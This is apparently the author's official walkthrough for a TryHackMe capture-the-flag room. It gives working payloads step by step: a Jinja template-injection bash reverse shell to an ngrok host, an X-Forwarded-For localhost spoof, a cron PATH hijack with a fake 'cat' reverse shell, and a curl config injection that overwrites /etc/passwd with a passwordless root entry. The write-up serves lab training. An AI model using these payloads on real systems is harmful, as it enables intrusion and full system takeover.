# Super Secret TIp - TryHackMe
https://tryhackme.com/room/supersecrettip

- First this you need to do is to do port scanning using NMAP or rustscan
```py
rustscan -a IP --ulimit 5000 
```
- You will find 2 open ports `22, 7777`
- Ignore SSH port and open `7777` port on your browser
- You will find a useless home page
- Use **gobuster** or **dirb** to do directory scanning, it might take a little bit on the gobuster small wordlist (word order ~5600)
```python
gobuster dir -u http://10.10.150.50:7777 -w '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt' -t 50
```
- It will find `/cloud` and `/debug`
- Open `/cloud` page, you will find a cloud/download kind-of page, you have an input field where you can download a custom name file of your choice (if it's found on the server ofc!) or choose a file from a list (you can choose both but the custom file name will not work then, you can use Burp to fix the params or use only custom file name field)
- Usually Python Flask application files are named either `app.py` or `source.py`, in this challenge it's named `source.py` hence why the custom field has a placeholder of `s` as a hint. Type in that in the custom field and hit download!  BUT! you can't! you can only type 6 characters (which is another hint for file name length -- without exntetion) in that input field! use `burp` to bypass it! there you go, you bypassed this very simple client-side restriction.
- You will get the source code!! VOILAA now it's much better 🚀
- You will find the hidden pages `/debug` and `/debugresult` alongside with the filteration functions etc.
- Visit `/debug`, a placeholder of `1337 * 1337` is shown in the input field, an indicator for **SSTI**! (hence the room name SuperSecretTIp)
- However, that debug page requires a password! look back at the source code, you will find a way to download a file that ends with `.txt`, if you're sherlock holmes like enough you will actually find that file name in the first few lines.. `supersecrettip.txt`, download it!
- Type that in `/cloud` input field and you will get an XORed password! hmm what could be the key! you can brute force but I bet if you can find the key with any common wordlists out there ;) to find out the key, take a look at the source code, there are 2 custom libraries being imported with a little hint '# .' which means they're local and in the same app folder! but source code only allows `.txt` files and `source.py` to be downloaded so how will we download `debugpassword.py` (`ip.py` for later)? **NULL BYTE**!! simply use this as the download param `download=debugpassword.py%00.txt` an VOILAA!! you will get the XOR key! now you can use the debug page!
- Try multiple ssti payloads or possibly use [SSTImap](https://github.com/vladko312/SSTImap) tool (didn't try that) you will find that the syntax is `{{7*7}}`!
- GREAT! now let's craft the payload, REMEMBER that we have some filters that restrict the use for some caracters such as `'` and `&`, the latter is important BUT we can bypass that!
- There are probably other solutions here but here is mine:
  - I use [revshells.com](revshells.com) to get my reverse shell payload (my goal)
  - `bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/18676 0>&1`
  - Grab some payloads from [ssti-payloads](https://github.com/payloadbox/ssti-payloads)/[hacktricks](https://book.hacktricks.xyz/welcome/readme)
  - I found this one useful for me 
  - `{{config.__class__.__init__.__globals__["os"].popen("ls")}}`
  - Now let's put our revshell
  - `{{config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/18676 0>&1\"")}}`
  - Don't forget to put your revshell payload inside `bash -c ""` otherwise an error will be thrown
  - Now we have an issue with `&` how can we bypass that? – you remember **String to ASCII**? cool! with python do `ord('&')` will result `38`, to get the character back from that ASCII number use `chr(38)` COOL!
  - Now since `chr` function is built in, we will try this payload to find out where we can find it
  - `{{config.__class__.__init__.__globals__}}` this will result in a long dictionary, one of the items is `__builtins__` which contains the `chr` function!
  - So now we replace all `&` with `config.__class__.__init__.__globals__["__builtins__"]["chr"](38)`, now our payload will be like this
 ```python
{{config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/10.13.21.244/5000 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
```
  - This is our custom crafted payload!
- Now put our payload into the debug field with password and submit!
- It should say `Executed`, once then you have to open `/debugresult` in order to make that payload actually run, as `/debug` only caches it in session.
- Make sure to use your **THM VPN IP** or if it's from attackbox then use your box IP in that payload
- Listen to the port you like, as follows `nc -lnvp 5000`, once you open the page you will see an `Unauthorized` error! with this specific description `Everything made in home, we don't like intruders.` sounds funny but interesting! it says it's made in **home**! does that relate to you in anyway? OFC! it's **localhost**! more precisely it's `127.0.0.1`! that is the real hacker's home! searching for spoofing IP in HTTP request you will find multiple ways, you can try all and you will find (and it's common) that it's the `X-Forward-For` HTTP Header that allows you to bypass this restriction! simply add that to your burp request header in burp repeater or any other way you like
```python
X-Forwarded-For: 127.0.0.1
```
- Now you have access to the `/debugresult` page! NOICE!
- Now you should also get your `ayham` user shell!
- 🚀 From there you will first find `flag1.txt` in `/home/ayham/`. **GG**!
- Now let's find `flag2.txt`
- Going to the root path `/` you will find `secret-tip.txt` it contains a hint about something missing 2 of something, this might confuse you but it's not yet related to the current progress, we'll get back to it.
- Searching for way to privesc to root, you will find MANY, one of the good places to search for system possible weaknesses is **cronjobs**! let's see `/etc/crontab/`(an extra advice but probably not very much needed here is the [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) tool, it's just amazing!)
```python
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```
- You see we have 2 user created jobs running, one by **root** and another by **F30s** (another normal user)
- For root job, it's trying to curl some website from file input, checking the content of that file we find that's it's owned by **F30s** user and it can't be read by others!
- That means we will have to horizontally privilege escalate to user **F30s**!
- Looking the second job, it's running `cat /home/F30s/health_check` but notice it's wrapped in a bash command `bash -lc 'cat /home/F30s/health_check'`, notice the `-lc` search for it or use `/man bash`, it's meant to run bash as a logged in user, that means it will read files from user profile that manipulates bash's behavior/commands, learn more [here](https://askubuntu.com/a/445015) 
- This means we can edit the `$PATH` environment variable! and lucky us the cronjob is not specifying the `cat` executable full path, so that means we can create our own `cat` executable file and put it anywhere in the system and add the path of it to $PATH (at the beginning to make it match first before the real `/bin/cat`) and execute our own code like revshell
- This is how we can have access to F30s user (horizontal privesc)
- Let's create our `cat` executable, we will create another RCE and place it in `/tmp`
```bash
echo 'bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/18676 0>&1' > /tmp/cat
chmod +x /tmp/cat # make executable - IMPORTANT!
```
- Now let's update **$PATH** by creating a/appending to `~/.profile` (it's read first after `/etc/profile`) that's how it's when using `bash -l` 
```bash
echo 'PATH="/tmp/:$PATH"' >> /home/F30s/.profile
```
- Now we wait a minute for the cronjob to kick in
- VOILAA! we've got our terminal now!
- Now going back to root cronjob, let's view `site_check`
```python
url = "http://127.0.0.1/health_check"
```
- It's just providng the url for the curl command, read more about `-K` option for curl command, it allows you to provide params by putting them in a file, it's like a legit param injection!
- You can add `output = ""` at the of `site_check` in a new line and this curl with sudo permissions will override any file you put in the output!
- So now we know we can override files, this opens multiple paths for exploitation, you can override `/etc/passwd`, `/etc/shadow`, `SSH authorized_keys` or even edit `sudoers` file!
- In this writeup, we are going to override `/etc/passwd`
- Let's create `/etc/passwd` or copy it from our local linux machine, read more about it [here](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/) (The line below will break the system users 😬 but we can still privesc to user `ayham` using the first foothold we had (SSTI) and switch user after then, keep in mind the cronjob of user **F30s** will be broken after we overwrite `/etc/passwd` with the line below due to the user missing UNLESS you copy the whole /etc/passwd file and put it in `health_check` – don't forget to remove root password – removing the `x` )
```python
root::0:0:root:/root:/bin/sh
```
- Now we simply switch user to root without password! `su root`
- VOILAA!! We're root!
- Now let's search for flag2.txt either using `find` or simply by looking at common places like `/root`
- `flag2.txt` is actually in `/root`, open it and VOILAAA! we go… hold on! WHAT! it's encrypted F\*\*\*! oh here we go again 😡
- We see another file called `secret.txt` open that we see another F\*\*\*ing encrypted text, however both flag2.txt and secret are following the byte-type text as the debug password, seems like another **XOR**
- Remember `secret-tip.txt`? that for our `secret.txt`, it mentions the following `Don't forget it's always about root!` so at first we can try `root` as the XOR key for secret.txt or flag2.txt, well flag2.txt didn't work using that key so we try on secret.txt
```py
$ python
>>> import pwn; pwn.xor(b'C^_M@__DC\\7,', b'root') # b'1109200013XX' -> 1109200013XX
```
- Guess what! we made it! we decrypted secret.txt! `1109200013XX` VOILAAA!! ahh hmm HOLD ON!! WHAT THE HELL! is it missing 2 characters??! ohh dammit, the tip said about mssing 2 of something, seems like it's this! let's try to use the key as if it's not missing anything does it work?!
- Sounds like it's almost working and indeed it's missing something, look at the result we got from the incomplete key
- `b'THM{cronjo\x02\x1d_F1Le_iNPuW[REDACTED]0\r\x0c1n3d_t0g3T(\x0bR}'`
- We're almost there!
- So I guess by looking around we won't find anything, the key is made of numbers, it's missing 2 so we only have 100 (00 included) guesses! time to **BRUTE FORCE** BABY!
- A simple python code or cyberchef can get this probably
```py
import pwn
import re

flag = b'ey}BQB_^[\\ZEnw\x01uWoY~a[REDACTED]0_\x03]mD\x00W\x02gpScL'
for i in range(0,10):
    for j in range(0,10):
        missing = f'{i}{j}'
        f = pwn.xor(flag, f'1109200013{missing}')
        if re.search("^b'THM\{[a-zA-Z0-9_]+}'$", str(f)) and str(f).__contains__('cronjobs'): # with testing the 'cronjobs' was found, it's the only result out of 100 that has the word 'cronjobs' others have very similar words like 'cronjobt'
            print(f"{missing}: " + str(f))
```
- aaaaannnnndddd GG! it's the final **VOILAAAA**!! no more tricks after this
- **Congratulations!**


# 🚀 A Thank You!
🚀 Thank you for reading all this long infinite official writeup :)
🚀 I hope you enjoyed the challenege and tickled your mind a little bit with it! AND sorry for the encryptions, even tho they're simple but they're annoying when reaching the flag finally

Until next challenge ;)

> Discord: `ayhamalali`
> 0NE_$H0T Team -- oneshotteam.net